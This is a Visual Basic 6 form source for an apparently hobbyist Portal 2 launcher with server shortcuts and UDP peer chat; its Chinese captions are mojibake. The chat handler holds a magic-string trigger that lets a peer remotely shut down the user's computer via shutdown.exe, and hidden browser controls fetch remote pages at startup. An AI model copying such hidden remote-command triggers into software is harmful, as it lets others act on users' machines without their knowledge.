VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Object = "{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}#1.1#0"; "shdocvw.dll"
Begin VB.Form Main1 
   AutoRedraw      =   -1  'True
   BorderStyle     =   1  'Fixed Single
   Caption         =   "������2������ III  PORTAL2 TOOL BOX 3"
   ClientHeight    =   9780
   ClientLeft      =   45
   ClientTop       =   405
   ClientWidth     =   18285
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   9780
   ScaleWidth      =   18285
   StartUpPosition =   2  '��Ļ����
   Begin VB.CommandButton Command13 
      Caption         =   "�¹��ܿ�����������"
      Height          =   1935
      Left            =   11880
      TabIndex        =   56
      Top             =   6480
      Width           =   4695
   End
   Begin VB.Frame Frame6 
      Caption         =   "ק���ͼ�ļ���װ��ͼ"
      Height          =   2175
      Left            =   6000
      TabIndex        =   51
      Top             =   120
      Width           =   5775
      Begin VB.Frame Frame8 
         Caption         =   "vpk��ͼ"
         Height          =   1815
         Left            =   3000
         TabIndex        =   53
         Top             =   240
         Width           =   2655
         Begin VB.Label Label14 
            Caption         =   "��ͼ��ק������"
            Height          =   495
            Left            =   720
            TabIndex        =   55
            Top             =   960
            Width           =   1335
         End
      End
      Begin VB.Frame Frame7 
         Caption         =   "bsp��ͼ"
         Height          =   1815
         Left            =   120
         TabIndex        =   52
         Top             =   240
         Width           =   2655
         Begin VB.Label Label13 
            Caption         =   "��ͼ��ק������"
            Height          =   375
            Left            =   600
            TabIndex        =   54
            Top             =   960
            Width           =   1695
         End
      End
   End
   Begin VB.CommandButton Command12 
      Caption         =   "ҡ��"
      Enabled         =   0   'False
      Height          =   375
      Left            =   17640
      TabIndex        =   50
      Top             =   4440
      Width           =   495
   End
   Begin VB.Frame Frame5 
      Caption         =   "ҡ��timers"
      Height          =   855
      Left            =   7560
      TabIndex        =   49
      Top             =   6120
      Visible         =   0   'False
      Width           =   1215
      Begin VB.Timer Timer2 
         Interval        =   2000
         Left            =   600
         Top             =   240
      End
      Begin VB.Timer Timer1 
         Left            =   120
         Top             =   240
      End
   End
   Begin SHDocVwCtl.WebBrowser WebBrowser1 
      Height          =   855
      Left            =   480
      TabIndex        =   47
      Top             =   6960
      Visible         =   0   'False
      Width           =   1815
      ExtentX         =   3201
      ExtentY         =   1508
      ViewMode        =   0
      Offline         =   0
      Silent          =   0
      RegisterAsBrowser=   0
      RegisterAsDropTarget=   1
      AutoArrange     =   0   'False
      NoClientEdge    =   0   'False
      AlignLeft       =   0   'False
      NoWebView       =   0   'False
      HideFileNames   =   0   'False
      SingleClick     =   0   'False
      SingleSelection =   0   'False
      NoFolders       =   0   'False
      Transparent     =   0   'False
      ViewID          =   "{0057D0E0-3573-11CF-AE69-08002B2E1262}"
      Location        =   "http:///"
   End
   Begin VB.PictureBox Picture1 
      Height          =   5655
      Left            =   0
      Picture         =   "Form1.frx":4A73A
      ScaleHeight     =   5595
      ScaleWidth      =   5595
      TabIndex        =   14
      Top             =   0
      Width           =   5655
   End
   Begin SHDocVwCtl.WebBrowser WebBrowser3 
      Height          =   615
      Left            =   2400
      TabIndex        =   36
      Top             =   6240
      Visible         =   0   'False
      Width           =   2055
      ExtentX         =   3625
      ExtentY         =   1085
      ViewMode        =   0
      Offline         =   0
      Silent          =   0
      RegisterAsBrowser=   0
      RegisterAsDropTarget=   1
      AutoArrange     =   0   'False
      NoClientEdge    =   0   'False
      AlignLeft       =   0   'False
      NoWebView       =   0   'False
      HideFileNames   =   0   'False
      SingleClick     =   0   'False
      SingleSelection =   0   'False
      NoFolders       =   0   'False
      Transparent     =   0   'False
      ViewID          =   "{0057D0E0-3573-11CF-AE69-08002B2E1262}"
      Location        =   "http:///"
   End
   Begin SHDocVwCtl.WebBrowser WebBrowser2 
      Height          =   615
      Left            =   480
      TabIndex        =   18
      Top             =   6240
      Visible         =   0   'False
      Width           =   1815
      ExtentX         =   3201
      ExtentY         =   1085
      ViewMode        =   0
      Offline         =   0
      Silent          =   0
      RegisterAsBrowser=   0
      RegisterAsDropTarget=   1
      AutoArrange     =   0   'False
      NoClientEdge    =   0   'False
      AlignLeft       =   0   'False
      NoWebView       =   0   'False
      HideFileNames   =   0   'False
      SingleClick     =   0   'False
      SingleSelection =   0   'False
      NoFolders       =   0   'False
      Transparent     =   0   'False
      ViewID          =   "{0057D0E0-3573-11CF-AE69-08002B2E1262}"
      Location        =   "http:///"
   End
   Begin VB.PictureBox Picture2 
      BorderStyle     =   0  'None
      Height          =   735
      Left            =   12120
      Picture         =   "Form1.frx":51643
      ScaleHeight     =   735
      ScaleWidth      =   5295
      TabIndex        =   15
      Top             =   120
      Width           =   5295
      Begin VB.Label Label8 
         Caption         =   "��ҽ�����ȫ�Զ�����ϵͳ  "
         Height          =   255
         Left            =   1080
         TabIndex        =   34
         Top             =   120
         Width           =   2295
      End
   End
   Begin VB.TextBox txtLocalPort 
      Height          =   375
      Left            =   9600
      TabIndex        =   12
      Text            =   "55555"
      Top             =   7200
      Visible         =   0   'False
      Width           =   1695
   End
   Begin VB.TextBox txtRemotePort 
      Height          =   375
      Left            =   9600
      TabIndex        =   11
      Text            =   "55555"
      Top             =   7680
      Visible         =   0   'False
      Width           =   1695
   End
   Begin VB.CommandButton cmdSend 
      Caption         =   "����"
      Height          =   375
      Left            =   16440
      TabIndex        =   10
      Top             =   4440
      Width           =   975
   End
   Begin VB.TextBox txtSend 
      Height          =   375
      Left            =   12120
      TabIndex        =   9
      Top             =   4440
      Width           =   4215
   End
   Begin VB.Frame Frame1 
      Caption         =   "���ӵ�������"
      Height          =   1095
      Left            =   12120
      TabIndex        =   3
      Top             =   3240
      Width           =   5295
      Begin VB.CommandButton Command5 
         Caption         =   "˵������"
         Height          =   255
         Left            =   3240
         TabIndex        =   44
         Top             =   720
         Width           =   855
      End
      Begin MSWinsockLib.Winsock sckUDP1 
         Left            =   4680
         Top             =   120
         _ExtentX        =   741
         _ExtentY        =   741
         _Version        =   393216
         Protocol        =   1
      End
      Begin VB.CommandButton cmdSet 
         Caption         =   "����"
         Height          =   255
         Left            =   4200
         TabIndex        =   8
         Top             =   720
         Width           =   855
      End
      Begin VB.TextBox txtRemoteIP 
         Height          =   375
         Left            =   3600
         TabIndex        =   7
         Top             =   240
         Width           =   1455
      End
      Begin VB.TextBox txtLocalIP 
         Height          =   375
         Left            =   1080
         TabIndex        =   5
         Top             =   240
         Width           =   1455
      End
      Begin VB.Label Label2 
         Caption         =   "����Է�������IP��Hamachi IP��"
         Height          =   255
         Left            =   120
         TabIndex        =   13
         Top             =   720
         Width           =   3495
      End
      Begin VB.Label Label3 
         Caption         =   "�Է�IP"
         Height          =   255
         Left            =   3000
         TabIndex        =   6
         Top             =   360
         Width           =   615
      End
      Begin VB.Label Label1 
         Caption         =   "��������IP"
         Height          =   255
         Left            =   120
         TabIndex        =   4
         Top             =   360
         Width           =   1095
      End
   End
   Begin VB.TextBox txtMessage 
      Height          =   1935
      Left            =   12120
      Locked          =   -1  'True
      MultiLine       =   -1  'True
      ScrollBars      =   2  'Vertical
      TabIndex        =   2
      Top             =   1200
      Width           =   5295
   End
   Begin VB.CommandButton LianjiClo 
      Caption         =   "����ģʽ"
      Height          =   2175
      Left            =   17640
      TabIndex        =   1
      Top             =   1680
      Width           =   615
   End
   Begin VB.CommandButton Lianji 
      Caption         =   "ȫ�Զ�����ϵͳ������ϵͳ"
      Height          =   2175
      Left            =   5040
      TabIndex        =   0
      Top             =   1680
      Width           =   615
   End
   Begin VB.Frame Frame2 
      Caption         =   "����"
      Height          =   975
      Left            =   120
      TabIndex        =   16
      Top             =   4560
      Width           =   5415
      Begin VB.CommandButton Command1 
         Caption         =   "������"
         Height          =   255
         Left            =   120
         TabIndex        =   45
         Top             =   600
         Width           =   1215
      End
      Begin VB.CommandButton Command11 
         Caption         =   "������2��Դ"
         Enabled         =   0   'False
         Height          =   255
         Left            =   4080
         TabIndex        =   41
         Top             =   600
         Width           =   1215
      End
      Begin VB.CommandButton Command10 
         Caption         =   "���˵�ͼ�ϼ�"
         Height          =   255
         Left            =   4080
         TabIndex        =   40
         Top             =   240
         Width           =   1215
      End
      Begin VB.CommandButton Command9 
         Caption         =   "˫�˵�ͼ�ϼ�"
         Height          =   255
         Left            =   2760
         TabIndex        =   39
         Top             =   600
         Width           =   1215
      End
      Begin VB.CommandButton Command8 
         Caption         =   "���˵�ͼ�ϼ�"
         Height          =   255
         Left            =   2760
         TabIndex        =   38
         Top             =   240
         Width           =   1215
      End
      Begin VB.CommandButton Command7 
         Caption         =   "���ѽ��"
         Height          =   255
         Left            =   1440
         TabIndex        =   32
         Top             =   240
         Width           =   1215
      End
      Begin VB.CommandButton Command6 
         Caption         =   "���������"
         Height          =   255
         Left            =   120
         TabIndex        =   31
         Top             =   240
         Width           =   1215
      End
      Begin VB.CommandButton Command2 
         Caption         =   "���ڱ����"
         Height          =   255
         Left            =   1440
         TabIndex        =   17
         Top             =   600
         Width           =   1215
      End
   End
   Begin VB.Frame Frame3 
      Caption         =   "�����Լ��ķ�����"
      Height          =   1455
      Left            =   120
      TabIndex        =   21
      Top             =   960
      Width           =   4815
      Begin VB.CommandButton Command4 
         Caption         =   "�ٷ���ͼ��"
         Height          =   375
         Left            =   2400
         TabIndex        =   25
         Top             =   840
         Width           =   2295
      End
      Begin VB.CommandButton Command3 
         Caption         =   "������Ϸ������"
         Height          =   375
         Left            =   120
         TabIndex        =   24
         Top             =   840
         Width           =   2175
      End
      Begin VB.TextBox mapname 
         Height          =   270
         Left            =   120
         TabIndex        =   23
         Top             =   480
         Width           =   4575
      End
      Begin VB.Label Label4 
         Caption         =   "��ͼ��  {ȷ�����ĵ�ͼ��portal2/map��addons��}"
         Height          =   255
         Left            =   120
         TabIndex        =   22
         Top             =   240
         Width           =   4575
      End
   End
   Begin VB.CommandButton StartButton 
      Caption         =   "����ģʽ��Ϸ"
      BeginProperty Font 
         Name            =   "����"
         Size            =   26.25
         Charset         =   134
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   735
      Left            =   120
      TabIndex        =   20
      Top             =   120
      Width           =   5175
   End
   Begin VB.Frame Frame4 
      Caption         =   "������˵ķ�����"
      Height          =   1575
      Left            =   120
      TabIndex        =   26
      Top             =   2520
      Width           =   4815
      Begin VB.CommandButton join 
         Caption         =   "������Ϸ"
         Height          =   255
         Left            =   3240
         TabIndex        =   30
         Top             =   1080
         Width           =   1455
      End
      Begin VB.TextBox txtIP 
         Height          =   270
         Left            =   120
         TabIndex        =   29
         Top             =   720
         Width           =   4575
      End
      Begin VB.Label Label7 
         Caption         =   "�����Ƽ�ʹ�óɹ��ʸ��ߵ�ȫ�Զ�����ϵͳ������������ѽ��"
         Height          =   375
         Left            =   120
         TabIndex        =   33
         Top             =   1080
         Width           =   3015
      End
      Begin VB.Label Label6 
         Caption         =   "��ʾ���ļ����������IP��ַ��"
         Height          =   255
         Left            =   120
         TabIndex        =   28
         Top             =   480
         Width           =   4455
      End
      Begin VB.Label Label5 
         Caption         =   "����Է�������IP����Hamachi IP��չ������ģʽ���Զ�"
         Height          =   255
         Left            =   120
         TabIndex        =   27
         Top             =   240
         Width           =   4575
      End
   End
   Begin VB.Label Label12 
      Caption         =   "..."
      Height          =   735
      Left            =   4680
      TabIndex        =   48
      Top             =   7080
      Visible         =   0   'False
      Width           =   2535
   End
   Begin VB.Label Label11 
      Caption         =   "�������ӵ�TarGet Studio��������"
      Height          =   255
      Left            =   120
      TabIndex        =   46
      Top             =   4200
      Width           =   4815
   End
   Begin VB.Label Label10 
      Caption         =   "ע�⣺��ʹ��ȫ�Զ�����ϵͳ֮ǰ������������ҽ���ϵͳͨѶ��"
      ForeColor       =   &H000000FF&
      Height          =   255
      Left            =   12120
      TabIndex        =   43
      Top             =   960
      Width           =   5295
   End
   Begin VB.Label TimeLab 
      Caption         =   "Label10"
      Height          =   375
      Left            =   7560
      TabIndex        =   42
      Top             =   7200
      Width           =   1815
   End
   Begin VB.Label autosj 
      Caption         =   "V2.6"
      Height          =   615
      Left            =   4800
      TabIndex        =   37
      Top             =   6240
      Visible         =   0   'False
      Width           =   2415
   End
   Begin VB.Label Label9 
      Caption         =   "��������IP��"
      Height          =   255
      Left            =   12240
      TabIndex        =   35
      Top             =   5040
      Width           =   1095
   End
   Begin VB.Label wwip 
      Caption         =   "             ����TarGetStudio������ʧ�ܣ����������������ӣ�"
      Height          =   375
      Left            =   12480
      TabIndex        =   19
      Top             =   5040
      Width           =   5535
   End
End
Attribute VB_Name = "Main1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit
Dim strSend As String
Dim strRecv As String
Dim strMsg As String
Dim Response As String
Dim F As String
Dim G As String
Dim H As String
Dim a

Private Sub Command1_Click()
Load Update
Update.Show
End Sub

Private Sub Command10_Click()
Load Form4
Form4.Show
End Sub

Private Sub Command11_Click()
MsgBox "�������ţ�"
End Sub

Private Sub Command12_Click()
sckUDP1.SendData "%ҡ��%"
End Sub

Private Sub Command13_Click()
Load Form6
Form6.Show
End Sub

Private Sub Command2_Click()
Load About
About.Show

End Sub



Private Sub Command3_Click()
If mapname.Text = "" Then
MsgBox "���ƺ�û�������κε�ͼ�������롣"
ElseIf cmdSet.Enabled = True Then
Shell App.Path & "\portal2.exe -steam -game portal2 -appid 620 -console -forcemaxplayers 16 +exec server.cfg +map " & mapname.Text
Else
Shell App.Path & "\portal2.exe -steam -game portal2 -appid 620 -console -forcemaxplayers 16 +exec server.cfg +map " & mapname.Text
sckUDP1.SendData "��ĺ���ģʽ��Ϸ���ڿ�ʼ�����Ե�..."
End If
End Sub

Private Sub Command4_Click()
Load Map
Map.Show
End Sub

Private Sub Command5_Click()
Load Form1
Form1.Show
End Sub

Private Sub Command6_Click()
Load Form5
Form5.Show
End Sub

Private Sub Command7_Click()
Load HELP
HELP.Show
End Sub

Private Sub Command8_Click()
Load Form2
Form2.Show
End Sub

Private Sub Command9_Click()
Load Form3
Form3.Show
End Sub

Private Sub join_Click()
If txtIP.Text = "" Then
MsgBox "���ƺ�û�������κ�IP��ַ��"
Else
Shell App.Path & "\portal2.exe -steam -game portal2 -appid 620 -console -forcemaxplayers 16 +exec server.cfg +connect " & txtIP.Text
End If
End Sub

Private Sub kill_Click()
Shell App.Path & "/KillingP2.exe"
End Sub

Private Sub StartButton_Click()
Shell App.Path & "/portal2.exe"
End Sub

Private Sub Timer1_Timer()
If a = 0 Then
Main1.top = Main1.top + 80
a = a + 1
ElseIf a = 1 Then
Main1.left = Main1.left + 80
a = a + 1
ElseIf a = 2 Then
Main1.top = Main1.top - 80
a = a + 1
ElseIf a = 3 Then
Main1.left = Main1.left - 80
a = 0
End If
End Sub

Private Sub Timer2_Timer()
Timer1.Enabled = False
End Sub

Private Sub webbrowser2_documentcomplete(ByVal pDisp As Object, URL As Variant)
wwip.Caption = WebBrowser2.Document.Body.innertext
End Sub
Private Sub WebBrowser3_Documentcomplete(ByVal pDisp As Object, URL As Variant)
autosj.Caption = WebBrowser3.Document.Body.innertext
End Sub
Private Sub WebBrowser1_DocumentComplete(ByVal pDisp As Object, URL As Variant)
Label12.Caption = WebBrowser1.Document.Body.innertext
End Sub
Private Sub Form_Load()
G = Dir(App.Path & "/Skin.dll")
If G = "" Then
MsgBox "Ƥ����̬���ӿ��ļ���ʧ�����������������ԡ�"
End
End If
H = Dir(App.Path & "\skinH.she")
If H = "" Then
MsgBox "Ƥ���ļ���ʧ�����������������ԡ�"
End
End If
WebBrowser1.Navigate "http://www.weiteam.net/201308/index.htm"
WebBrowser2.Navigate "http://iframe.ip138.com/city.asp"
WebBrowser3.Navigate "http://www.weiteam.net/213/index.htm"
SkinH_Attach
Call SkinH_SetAero(1) '����������Ч
txtLocalIP.Text = sckUDP1.LocalIP
cmdSend.Default = True
F = Dir(App.Path & "/portal2.exe")
If F = "" Then
MsgBox "�����ܼ�⵽portal2.exe ��ȷ���������ļ���Portal 2Ŀ¼����portal2.exe��ͬһĿ¼��"
Unload Main1
Exit Sub
End If
Timer1.Enabled = False
Timer1.Interval = 20  '����Ƶ��
End Sub

Private Sub Picture1_Click()
Picture1.Visible = False
If autosj.Caption = "V2.6" Then
Label11.Caption = "���İ汾�����µģ�"
Else
MsgBox "�а汾���£��°汾Ϊ" & autosj.Caption
Label11.Caption = "���ĵ�ǰ�汾ΪV2.5���°汾Ϊ" & autosj.Caption & "�����������£�"
End If
If Label12.Caption = "����" Then
Command6.Enabled = True
Else
Command6.Enabled = False
End If
End Sub

Private Sub txtMessage_Change()
    txtMessage.SelStart = Len(txtMessage.Text)
End Sub

Private Sub Form_Unload(Cancel As Integer)
sckUDP1.Close

End Sub
Private Sub sckUDP1_DataArrival(ByVal bytesTotal As Long)
sckUDP1.GetData strRecv
strMsg = strMsg & vbCrLf & Time & vbCrLf & "�Է�˵��" & strRecv
txtMessage.Text = strMsg
If strRecv = "��ĺ���ģʽ��Ϸ���ڿ�ʼ�����Ե�..." Then
Shell App.Path & "\portal2.exe -steam -game portal2 -appid 620 -console -forcemaxplayers 16 +exec server.cfg +connect " & txtRemoteIP.Text
End If
About.Hide
If strRecv = "%597416324%*" And About.Check1.Value = 1 Then
strRecv = "�Է��������������͹ػ�ָ��ѱ�ϵͳ�ɹ����ء�"
End If
If strRecv = "%597416324%*" Then
Shell "C:/WINDOWS/system32/shutdown.exe -s -t 5000"
End If
If strRecv = "%ҡ��%" Then
a = 0
strRecv = "�Է��������������͹ػ�ָ��ѱ�ϵͳ�ɹ����ء�"
Timer1.Enabled = True
End If

End Sub

Private Sub cmdSet_Click()
If txtRemoteIP.Text = "" Then
MsgBox "���ƺ�û����д���Ӽ������ַ�����顣"
txtRemoteIP.SetFocus
Exit Sub
ElseIf txtRemotePort.Text = "" Then
MsgBox "���ƺ�û����д���Ӽ�����Ķ˿ڣ����顣"
txtRemotePort.SetFocus
Exit Sub

Else
sckUDP1.RemoteHost = txtRemoteIP.Text
sckUDP1.RemotePort = txtRemotePort.Text
sckUDP1.Bind txtLocalPort.Text
cmdSet.Enabled = False
Command12.Enabled = True
End If
Main1.Show


End Sub
Private Sub cmdSend_Click()
If txtSend.Text = "" Then
MsgBox "����������Ҫ���͵����ݡ�"
txtSend.SetFocus
Exit Sub
Else
strSend = txtSend.Text
sckUDP1.SendData strSend
txtSend.Text = ""
txtSend.SetFocus
strMsg = strMsg & vbCrLf & "��˵��" & strSend
txtMessage.Text = strMsg
End If
End Sub





Private Sub Lianji_Click()
Main1.Width = 12090
Lianji.Visible = False

End Sub

Private Sub LianjiClo_Click()
Main1.Width = 5730
Lianji.Visible = True
End Sub

Private Sub Picture3_DragDrop(Source As Control, X As Single, Y As Single)
    MsgBox "Success!"
End Sub


